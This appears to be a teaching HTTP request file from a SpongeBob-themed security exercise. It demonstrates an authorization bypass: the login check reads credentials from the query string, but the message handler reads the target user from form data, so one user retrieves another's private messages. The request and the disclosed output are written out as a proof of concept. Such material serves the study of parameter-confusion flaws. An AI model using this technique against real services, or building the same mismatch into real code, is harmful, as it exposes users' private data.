### EXPLOIT: Plankton authenticates as SpongeBob but accesses Squidward's messages
### The modular authentication function reads from query, but message retrieval uses form data
GET {{base}}?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=squidward

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }
#
# IMPACT: Despite authentication being separated into its own function (which makes
# the code look more professional), Plankton still steals Squidward's secrets!
# The vulnerability persists because the authenticate_user() function reads from
# query parameters while the handler reads from form data.
